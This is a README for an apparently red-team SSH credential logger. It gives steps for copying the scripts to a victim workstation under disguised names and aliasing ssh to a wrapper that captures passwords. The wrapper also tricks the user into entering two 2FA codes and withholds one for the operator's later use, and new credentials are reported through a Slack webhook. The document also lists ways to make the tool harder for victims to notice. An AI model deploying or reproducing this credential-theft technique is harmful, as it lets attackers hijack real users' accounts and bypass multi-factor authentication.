**ssh_credlogger**

An expect + sh script that logs passwords, prompts users for two 2fa codes, and writes them to a local file.  The Red Team will then be alerted of new creds being logged via a Slack webhook.  

The scripts will prompt for two 2fa codes - after the second code is input, the FIRST code is sent to the SSH server, leaving the operator with a still-valid passcode #1 to copy and use later.

**Steps:**

- Copy this file and ssh_snoop.sh to victim workstation, renamed to something less obvious
- On victim workstation run alias ssh="/path/to/this/file.expect 2>/dev/null"
    (the stderr redirect prevents a 10-line error message when the user exits ssh)
- Ensure your alias links to the correct path for this file
- Ensure the "spawn" command below links to the correct path for the renamed ssh_credlogger.sh

**Things to improve:**

    - passcode2 does not stream out to tty, we only see passcode1 come out after a delay in one fell swoop
    - when entering passcode2 the user may notice the "key" cursor instead of the normal cursor

